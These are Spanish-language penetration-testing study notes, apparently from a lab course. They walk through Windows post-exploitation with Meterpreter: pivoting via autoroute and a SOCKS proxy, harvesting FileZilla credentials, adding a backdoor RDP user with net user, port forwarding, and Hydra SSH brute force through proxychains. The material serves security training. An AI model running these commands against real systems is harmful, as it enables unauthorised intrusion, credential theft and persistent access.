## Post-Explotación en Windows

### Descripción

Este apartado está pensado para cuando se obtenga una sesión de Meterpreter mediante Metasploit. Se recomienda utilizar el payload `windows/x64/meterpreter/reverse_tcp`.

### Comandos Útiles en Meterpreter

1. `sysinfo` - Proporciona información detallada del sistema.
2. `getuid` - Muestra el usuario actual.
3. `getsystem` - Intenta realizar una escalada de privilegios.
4. `shell` - Activa una consola interactiva para ejecutar comandos de Windows (por ejemplo, hacer `ping` para verificar conectividad).
5. `Ctrl + C` - Finaliza la sesión actual de shell interactivo.

### Procedimiento de Pivoting

6. Iniciar el módulo de autoroute:
    
    ```bash
    run autoroute -s <red>
    ```
    
7. Poner la sesión en segundo plano:
    
    ```bash
    background
    ```
    
8. Cambiar a otra sesión de Meterpreter:
    
    ```bash
    sessions -i <id>
    background
    ```
    
9. Escaneo de aplicaciones:
    
    ```bash
    use post/windows/gather/enum_application
    set SESSION <id>
    run
    ```
    
10. Obtener credenciales de FileZilla (si aplica):
    
    ```bash
    use post/multi/gather/filezilla_client_cred
    set SESSION <id>
    run
    ```
    
11. Configurar un proxy SOCKS:
    
    ```bash
    use auxiliary/server/socks_proxy
    set SRVPORT 9050
    set VERSION 4a
    exploit
    jobs
    ```
    
12. Escaneo de puertos con proxychains:
    
    ```bash
    proxychains nmap <ip> -sT -Pn -p1-50
    ```
    
13. Creación de un usuario remoto desde la sesión de Meterpreter:
    
    ```bash
    shell
    net user guest_1 guestpwd /add
    net localgroup "Remote Desktop users" guest_1 /add
    net user
    ```
    
14. Acceso remoto con RDP:
    
    ```bash
    xfreerdp /u:guest_1 /p:guestpwd /v:<ip>
    ```
    
15. Prueba de credenciales obtenidas (por ejemplo, FileZilla).

### Encaminamiento de Puertos

16. Redirección de puertos:
    
    ```bash
    portfwd add -l 1234 -p 22 -r <ip_2>
    ```
    

### Ataques de Fuerza Bruta y Conexión SSH

17. Ataque de fuerza bruta con Hydra:
    
    ```bash
    proxychains hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip_2>
    ```
    
18. Conexión SSH:
    
    ```bash
    proxychains ssh user@<ip>
    ```

**Nota:** Según el ejemplo visto aunque el comando `run autoroute -s 10.4.27.0/20` funciona, lo más preciso sería utilizar `10.4.16.0/20`, ya que esta es la red válida según la máscara /20. Metasploit ajusta internamente la red al rango correcto, pero es recomendable ser exacto para evitar confusión en otros entornos o configuraciones más estrictas.